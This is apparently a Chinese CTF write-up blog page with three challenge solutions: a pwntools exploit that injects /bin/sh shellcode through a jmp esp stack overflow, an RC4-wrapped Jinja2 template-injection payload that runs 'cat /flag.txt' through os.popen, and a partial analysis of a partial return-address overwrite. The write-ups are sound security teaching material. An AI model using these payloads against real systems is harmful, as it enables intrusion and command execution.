<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">vul</span></span>() &#123;</span><br><span class="line">  char s[32]; // [esp+18h] [ebp-20h] BYREF</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(s, 50, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  <span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>栈上可执行 首先想着就是在s数组中写入shellcode然后跳转到s   但因为aslr栈地址随机化无法知道s的地址  也没有别的后门函数</p>
<p>查看<code>jmp</code>gadget发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only &quot;ret|jmp&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">[...]</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="jmp-esp用处"><a href="#jmp-esp用处" class="headerlink" title="jmp esp用处"></a>jmp esp用处</h3><p>当当前函数执行到<code>leave</code>指令后（即<code>mov esp, ebp;pop ebp</code>），esp指向<code>ret addr</code>，接着<code>ret</code>跳转执行 <code>esp = esp + 4; eip = ret addr</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →  | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">↑ esp 									   ↑ esp     eip = 0x11</span><br></pre></td></tr></table></figure>

<p>但如果ret addr处地址为<code>jmp esp</code>的地址  则执行完jmp之后，eip和esp指向同一块位置，也就是接着执行栈上的指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →   | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">↑ esp 	                                       ↑ esp   eip = 0x11(jmp esp)</span><br><span class="line">               |------------|------...----|</span><br><span class="line"> ➤ jmp esp ➤   | addr 0x11  |      ...    |</span><br><span class="line">               |------------|------...----|</span><br><span class="line">                            ↑ esp,eip</span><br></pre></td></tr></table></figure>

<p>因此我们可以在ret addr之后写入汇编指令  但是由于只有<code>50 - 32 = 18</code>字节的溢出空间，显然不够写入完整shellcode </p>
<p>但是可以把shellcode写入变量s  在ret addr之后写入<code>sub esp, 0x28;jmp esp</code>   0x20(s) + 0x4(old ebp) + 0x4(ret addr) &#x3D; 0x28</p>
<p>这样子就可以把esp移到变量s的地址，然后跳转执行s里的shellcode</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0804857A</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode, from https://shell-storm.org/shellcode/files/shellcode-811.html</span></span><br><span class="line">shcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span>   </span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0804836a</span></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>)	<span class="comment"># move esp back to s, then jmp to esp</span></span><br><span class="line"></span><br><span class="line">proc.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>, shcode.ljust(<span class="number">0x24</span>, <span class="string">b&#x27;h&#x27;</span>) + p32(jmp_esp) + sub_esp_jmp)</span><br><span class="line"></span><br><span class="line">proc.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/04/NISACTF2022-isSecret-wp/" >NISACTF2022-isSecret-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-04
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2102">题目链接</a>  </p>
<p>显示<code>Welcome To Find Secret</code></p>
<p>访问<code>/secret</code>，看到<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>传secret参数<code>/secret?secret=123456</code>发现报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File &quot;/app/app.py&quot;, line 35, in secret</span></span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>RC4解密后进行render渲染，很明显直接模板注入</p>
<h3 id="RC4加密脚本："><a href="#RC4加密脚本：" class="headerlink" title="RC4加密脚本："></a>RC4加密脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key=<span class="string">&quot;HereIsTreasure&quot;</span>, message=<span class="string">&quot;ciscn&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> % quote(cipher))</span><br><span class="line">    <span class="comment"># print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后传参secret，即可获取flag</p>

	
	</div>
  <a type="button" href="/2023/09/04/NISACTF2022-isSecret-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/03/Hacklu2015-stackstuff-wp/" >nightmare 7.1.1.Hacklu2015-stackstuff-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-03
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/15-partial_overwrite/hacklu15_stackstuff">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec stackstuff </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><code>14#</code>设定在端口1514监听，<code>24#accept</code>接收到socket之后fork出子进程，执行<code>37#execl</code>，即执行到<code>4#handle_request</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">   <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(*argv, <span class="string">&quot;reexec&quot;</span>)) &#123;</span><br><span class="line">        handle_request();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v4 = socket(<span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        fd = negchke(v4, <span class="string">&quot;unable to create socket&quot;</span>);</span><br><span class="line">        *(_QWORD *)&amp;addr.sa_family = <span class="number">10LL</span>;</span><br><span class="line">        *(_QWORD *)&amp;addr.sa_data[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">        v15 = <span class="number">0LL</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        *(_WORD *)addr.sa_data = htons(<span class="number">1514u</span>);</span><br><span class="line">        optval = <span class="number">1</span>;</span><br><span class="line">        v5 = setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>);</span><br><span class="line">        negchke(v5, <span class="string">&quot;unable to set SO_REUSEADDR&quot;</span>);</span><br><span class="line">        v6 = bind(fd, &amp;addr, <span class="number">0x1C</span>u);</span><br><span class="line">        negchke(v6, <span class="string">&quot;unable to bind&quot;</span>);</span><br><span class="line">        v7 = listen(fd, <span class="number">16</span>);</span><br><span class="line">        negchke(v7, <span class="string">&quot;unable to listen&quot;</span>);</span><br><span class="line">        signal(<span class="number">17</span>, (<span class="type">__sighandler_t</span>)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            v8 = accept(fd, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">            v18 = negchke(v8, <span class="string">&quot;unable to accept&quot;</span>);</span><br><span class="line">            v9 = fork();</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="type">unsigned</span> <span class="type">int</span>)negchke(v9, <span class="string">&quot;unable to fork&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            close(v18);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        v10 = dup2(v18, <span class="number">0</span>);</span><br><span class="line">        negchke(v10, <span class="string">&quot;unable to dup2&quot;</span>);</span><br><span class="line">        v11 = dup2(v18, <span class="number">1</span>);</span><br><span class="line">        negchke(v11, <span class="string">&quot;unable to dup2&quot;</span>);</span><br><span class="line">        close(v18);</span><br><span class="line">        v12 = execl(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;reexec&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">        negchke(v12, <span class="string">&quot;unable to reexec&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="handle-request"><a href="#handle-request" class="headerlink" title="handle_request"></a>handle_request</h3><p>读取密码，<code>15#require_auth</code>进行验证，验证通过输出flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> v1[<span class="number">64</span>];  <span class="comment">// [rsp+0h] [rbp-58h] BYREF</span></span><br><span class="line">    FILE *v2;     <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">    stream = fopen(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!stream || !fgets(real_password, <span class="number">50</span>, stream)) &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;unable to read real_password\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x1D</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hi! This is the flag download service.&quot;</span>);</span><br><span class="line">    require_auth();</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!v2 || !fgets(v1, <span class="number">50</span>, v2)) &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;unable to read flag\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="require-auth-gt-check-password-correct"><a href="#require-auth-gt-check-password-correct" class="headerlink" title="require_auth  -&gt; check_password_correct"></a>require_auth  -&gt; check_password_correct</h3><p>读取长度，超过50则置为90，明显栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">check_password_correct</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> v0;    <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v2;       <span class="comment">// [rsp+Ch] [rbp-4Ch] BYREF</span></span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">50</span>]; <span class="comment">// [rsp+10h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ptr));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To download the flag, you need to specify a password.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Length of password: &quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d\n&quot;</span>, &amp;v2) != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">50</span>)</span><br><span class="line">        v2 = <span class="number">90</span>;</span><br><span class="line">    v0 = fread(ptr, <span class="number">1uLL</span>, v2, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (v0 != v2)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(ptr, real_password) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="子进程中check-password-correct调试方法"><a href="#子进程中check-password-correct调试方法" class="headerlink" title="子进程中check_password_correct调试方法"></a>子进程中check_password_correct调试方法</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># terminal 1</span></span><br><span class="line">$ gdb stackstuff</span><br><span class="line">gef➤  <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">gef➤  b check_password_correct</span><br><span class="line">gef➤  r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在另一个terminal 2</span></span><br><span class="line">$ nc 127.0.0.1 1514</span><br><span class="line"></span><br><span class="line"><span class="comment"># terminal 1 中即可看到运行到check_password_correct</span></span><br></pre></td></tr></table></figure>

<p>程序虽然存在栈溢出，但是开了PIE也没有泄露的地方  首先想着能不能直接覆盖返回地址的低位字节控制跳转</p>
<p>gdb调试进入到<code>check_password_correct</code>，获取输入到ret_addr的偏移量为<code>0x7fffffffe398 - 0x007fffffffe350 = 0x48</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x555555400f7e → check_password_correct()</span><br><span class="line">[#1] 0x555555400fd1 → require_auth()</span><br><span class="line">[#2] 0x55555540108b → handle_request()</span><br><span class="line">[#3] 0x55555540112d → main()</span><br><span class="line"></span><br><span class="line">gef➤  info f</span><br><span class="line">Stack level 0, frame at 0x7fffffffe3a0:</span><br><span class="line"> rip = 0x555555400f7e in check_password_correct; saved rip = 0x555555400fd1</span><br><span class="line"> called by frame at 0x7fffffffe3b0</span><br><span class="line"> Arglist at 0x7fffffffe338, args: </span><br><span class="line"> Locals at 0x7fffffffe338, Previous frame&#x27;s sp is 0x7fffffffe3a0</span><br><span class="line"> Saved registers:</span><br><span class="line">  rip at 0x7fffffffe398	# ret addr</span><br><span class="line"></span><br><span class="line">gef➤  stack 15</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x007fffffffe340│+0x0000: 0x007ffff7f98760  →  0x00000000fbad2887	 ← $rsp</span><br><span class="line">0x007fffffffe348│+0x0008: 0x0000005af7e47283</span><br><span class="line">0x007fffffffe350│+0x0010: &quot;afdsfasdfasdf\ngasfdasffffffffffffffffffffffffffff[...]&quot;</span><br><span class="line">0x007fffffffe358│+0x0018: &quot;fasdf\ngasfdasffffffffffffffffffffffffffffffffffff[...]&quot;</span><br><span class="line">0x007fffffffe360│+0x0020: &quot;sfdasfffffffffffffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe368│+0x0028: &quot;ffffffffffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe370│+0x0030: &quot;ffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe378│+0x0038: &quot;ffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe380│+0x0040: &quot;ffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe388│+0x0048: &quot;ffffffff\n&quot;</span><br><span class="line">0x007fffffffe390│+0x0050: 0x0000000000000a (&quot;\n&quot;?)</span><br><span class="line">0x007fffffffe398│+0x0058: 0x00555555400fd1  →  &lt;require_auth+23&gt; test eax, eax</span><br><span class="line">0x007fffffffe3a0│+0x0060: 0x0000000000000000</span><br><span class="line">0x007fffffffe3a8│+0x0068: 0x0055555540108b  →  &lt;handle_request+177&gt; lea rsi, [rip+0x36d]        # 0x5555554013ff</span><br><span class="line">0x007fffffffe3b0│+0x0070: 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>但是read长度为<code>90 == 0x5a</code>，所以还要往下写0x12个字节，那么整个返回地址都会被覆盖掉，这个方法也就不行了</p>
<p>但是发现能刚刚好覆盖<code>0x0x007fffffffe3a8</code>处上层栈帧的返回地址的最低两个字节，即<code>require_auth</code>成功执行结束后开始读取flag的地址，明显也就是我们想要的跳转地址</p>
